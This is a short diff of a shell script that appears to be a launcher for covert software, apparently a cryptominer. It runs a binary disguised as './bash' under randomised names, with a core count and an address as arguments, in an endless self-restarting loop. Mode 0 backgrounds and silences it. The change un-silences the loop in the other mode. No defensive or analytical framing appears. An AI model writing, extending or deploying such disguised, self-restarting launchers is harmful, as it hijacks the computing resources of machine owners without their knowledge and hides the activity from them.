@@ -53,7 +53,8 @@ if [ "$mode" == "0" ]; then
   name=`RandString 2 c${cores}_${addr}`;
   bash -c "while true; do cd "${work}"; ./bash ${name} ${cores} >/dev/null 2>&1 ; sleep 5; done" >/dev/null 2>&1 &
 else
-  while true; do cd "${work}"; name=`RandString 2 d${cores}_${addr}`; ./bash ${name} ${cores} >/dev/null 2>&1 ; sleep 5; done
+  # while true; do cd "${work}"; name=`RandString 2 d${cores}_${addr}`; ./bash ${name} ${cores} >/dev/null 2>&1 ; sleep 5; done
+  while true; do cd "${work}"; name=`RandString 2 d${cores}_${addr}`; ./bash ${name} ${cores} ; sleep 5; done
 fi
 
 
